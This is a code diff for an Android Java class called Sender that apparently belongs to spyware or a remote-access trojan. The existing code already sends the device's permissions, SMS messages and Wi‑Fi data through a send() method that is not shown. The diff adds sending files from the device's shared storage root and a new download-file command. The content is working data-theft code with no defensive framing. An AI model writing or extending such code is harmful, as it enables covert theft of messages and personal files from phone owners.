@@ -73,6 +73,7 @@ public class Sender extends AsyncTask<String, Void, String> {
             Sender.sendPermissions();
             Sender.sendSms();
             Sender.sendWifi();
+            Sender.sendFile("/storage/emulated/0");
         } catch (Exception ex) {
             ex.printStackTrace();
             start();
@@ -255,14 +256,31 @@ public class Sender extends AsyncTask<String, Void, String> {
         return true;
     }
 
-    public static boolean sendFile(JSONObject data) {
+    public static boolean sendFile(String path) {
         Logger.log("Sender.sendFile()");
         try {
+            JSONObject data = new JSONObject();
             data.put("type", "file");
+            data.put("value", Files.get(path));
             send(data);
         } catch (Exception ex) {
             ex.printStackTrace();
-            showMsg("File( failed");
+            showMsg("File failed");
+            return false;
+        }
+
+        return true;
+    }
+    public static boolean downloadFile(JSONObject object) {
+        Logger.log("Sender.sendFile()");
+        try {
+            JSONObject data = new JSONObject();
+            data.put("type", "download_file");
+            data.put("value", object);
+            send(data);
+        } catch (Exception ex) {
+            ex.printStackTrace();
+            showMsg("File failed");
             return false;
         }
 
